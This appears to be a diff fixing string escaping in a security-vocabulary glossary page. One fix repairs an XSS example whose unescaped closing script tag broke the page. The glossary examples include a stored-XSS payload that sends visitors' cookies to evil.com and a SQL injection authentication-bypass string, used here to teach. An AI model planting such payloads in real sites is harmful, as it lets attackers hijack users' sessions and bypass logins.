@@ -1258,27 +1258,22 @@ td strong { color: var(--text); }
 
 const secVocabTerms = [
   { term: 'Zero-Day', def: 'A vulnerability that is unknown to the vendor and has no available patch at the time of exploitation.', example: 'Stuxnet exploited four zero-days simultaneously to attack Iranian nuclear centrifuges.' },
-  { term: 'Threat Actor', def: 'Any entity — person, group, or nation-state — that poses a potential threat to an organization's assets.', example: 'APT29 (Cozy Bear) is a nation-state threat actor attributed to Russia's SVR intelligence service.' },
+  { term: 'Threat Actor', def: 'Any entity — person, group, or nation-state — that poses a potential threat to an organization\'s assets.', example: 'APT29 (Cozy Bear) is a nation-state threat actor attributed to Russia\'s SVR intelligence service.' },
   { term: 'Vulnerability', def: 'A weakness in a system, software, or process that could be exploited to cause harm.', example: 'Unpatched Apache Log4Shell (CVE-2021-44228) was a critical RCE vulnerability in millions of systems.' },
   { term: 'Exploit', def: 'Code or a technique that takes advantage of a vulnerability to cause unintended behavior.', example: 'The EternalBlue exploit attacked SMBv1 to allow remote code execution, used in WannaCry ransomware.' },
   { term: 'Least Privilege', def: 'Security principle giving users and processes only the minimum permissions needed to perform their function.', example: 'A web server process runs as a low-privilege user, not root — so a compromise limits attacker access.' },
   { term: 'Defense in Depth', def: 'Layered security strategy so that if one control fails, additional controls prevent or limit damage.', example: 'Firewall + IDS + endpoint AV + MFA + SIEM — each layer is an independent line of defense.' },
   { term: 'AAA Framework', def: 'Authentication (who are you?), Authorization (what can you do?), and Accounting (what did you do?) — the core of access control.', example: 'RADIUS provides AAA for network device login: authenticates via password, authorizes command sets, logs activity.' },
   { term: 'PKI (Public Key Infrastructure)', def: 'A framework of policies, software, and hardware used to create, manage, distribute, and revoke digital certificates.', example: 'A CA issues an X.509 certificate binding your domain name to your public key, enabling HTTPS.' },
-  { term: 'Digital Signature', def: 'A cryptographic mechanism that proves the authenticity and integrity of a message or document using the sender's private key.', example: 'Software vendors sign executables so your OS can verify the code has not been tampered with since publication.' },
+  { term: 'Digital Signature', def: 'A cryptographic mechanism that proves the authenticity and integrity of a message or document using the sender\'s private key.', example: 'Software vendors sign executables so your OS can verify the code has not been tampered with since publication.' },
   { term: 'Symmetric Encryption', def: 'Encryption using the same key for both encryption and decryption. Fast but requires secure key exchange.', example: 'AES-256 encrypts your BitLocker drive — the single key must be protected (TPM chip, recovery key).' },
-  { term: 'Asymmetric Encryption', def: 'Encryption using a mathematically related key pair: public key to encrypt, private key to decrypt.', example: 'When you connect to HTTPS, your browser encrypts a session key with the server's public certificate (RSA/ECC).' },
+  { term: 'Asymmetric Encryption', def: 'Encryption using a mathematically related key pair: public key to encrypt, private key to decrypt.', example: 'When you connect to HTTPS, your browser encrypts a session key with the server\'s public certificate (RSA/ECC).' },
   { term: 'Hashing', def: 'A one-way function producing a fixed-length digest from arbitrary input. Even tiny input changes produce completely different hashes.', example: 'SHA-256("hello") = 2cf24... SHA-256("helo") = totally different — detecting even a single bit flip.' },
   { term: 'Social Engineering', def: 'Manipulating people into divulging confidential information or performing actions that compromise security.', example: 'A vishing call impersonates IT support: "Your account is locked — please verify your password to re-enable it."' },
   { term: 'Phishing', def: 'A social engineering attack using fraudulent email to steal credentials, install malware, or trick users into taking harmful actions.', example: 'A spoofed "Microsoft 365" email claims your mailbox is full — clicking redirects to a fake login harvesting credentials.' },
   { term: 'Man-in-the-Middle (MitM)', def: 'An attack where the adversary secretly intercepts and possibly alters communication between two parties who believe they are communicating directly.', example: 'ARP poisoning on a LAN lets an attacker intercept traffic between a PC and its default gateway.' },
   { term: 'SQL Injection', def: 'An injection attack where malicious SQL code is inserted into an input field to manipulate a backend database.', example: "Login form input: ' OR '1'='1 — bypasses authentication if query is not parameterized." },
-  { term: 'Cross-Site Scripting (XSS)', def: 'A web attack injecting malicious scripts into pages viewed by other users, hijacking sessions or stealing cookies.', example: 'Stored XSS: attacker posts a comment containing <script>document.location='evil.com/steal?c='+document.cookie
-document.addEventListener('DOMContentLoaded', function() {
-  buildVocabSec(secVocabTerms);
-});
-
-</script>' },
+  { term: 'Cross-Site Scripting (XSS)', def: 'A web attack injecting malicious scripts into pages viewed by other users, hijacking sessions or stealing cookies.', example: 'Stored XSS: attacker posts a comment containing <script>document.location=\'evil.com/steal?c=\'+document.cookie<\/script> — every viewer leaks their cookie to the attacker.' },
   { term: 'DDoS (Distributed Denial of Service)', def: 'An attack using many compromised hosts to flood a target with traffic, exhausting its resources and making it unavailable.', example: 'A botnet of 100,000 IoT devices sends 1 Tbps of UDP traffic to a DNS server, taking it offline.' },
   { term: 'Ransomware', def: 'Malware that encrypts victim files and demands payment (often cryptocurrency) for the decryption key.', example: 'WannaCry spread via EternalBlue, encrypted files, and demanded $300 in Bitcoin — impacting 200,000+ systems in 150 countries.' },
   { term: 'SIEM', def: 'Security Information and Event Management — a platform that collects, correlates, and analyzes log data from across an environment to detect threats.', example: 'Splunk correlates failed login attempts from 50 IPs with a successful login 30 seconds later — triggers a brute-force alert.' },
@@ -1286,7 +1281,7 @@ document.addEventListener('DOMContentLoaded', function() {
   { term: 'Multi-Factor Authentication (MFA)', def: 'Requiring two or more authentication factors: something you know (password), have (token), or are (biometric).', example: 'Login with password (know) + Google Authenticator TOTP code (have) — even a stolen password is useless without the phone.' },
   { term: 'Principle of Need to Know', def: 'Users are granted access to information only if their job function requires it, regardless of their clearance level.', example: 'A finance analyst has SECRET clearance but cannot access SECRET military intelligence unrelated to their finance role.' },
   { term: 'Chain of Custody', def: 'A documented record of who handled digital evidence, when, and how — ensuring its integrity and admissibility in legal proceedings.', example: 'A forensic investigator creates a bit-for-bit disk image, records the hash, and logs every transfer of the evidence drive.' },
-  { term: 'Business Continuity Plan (BCP)', def: 'A proactive plan to ensure critical business functions continue during and after a disaster or major disruption.', example: 'A bank's BCP ensures online banking stays up even if the primary data center loses power — via a hot site failover.' },
+  { term: 'Business Continuity Plan (BCP)', def: 'A proactive plan to ensure critical business functions continue during and after a disaster or major disruption.', example: 'A bank\'s BCP ensures online banking stays up even if the primary data center loses power — via a hot site failover.' },
   { term: 'RPO / RTO', def: 'Recovery Point Objective = maximum acceptable data loss (in time). Recovery Time Objective = maximum acceptable downtime.', example: 'RPO of 4 hours means backups every 4 hours. RTO of 2 hours means systems must be back up within 2 hours of an outage.' },
   { term: 'NIST CSF', def: 'NIST Cybersecurity Framework — a voluntary framework with five functions: Identify, Protect, Detect, Respond, Recover.', example: 'An organization uses NIST CSF to assess maturity: they score well on Protect but low on Detect — prioritizing SIEM investment.' }
 ];
@@ -1707,6 +1702,9 @@ function buildScoreCard(score, total) {
 }
 
   loadTracker();
+  if (typeof buildVocabSec === 'function' && typeof secVocabTerms !== 'undefined') {
+    buildVocabSec(secVocabTerms);
+  }
 </script>
 </body>
 </html>
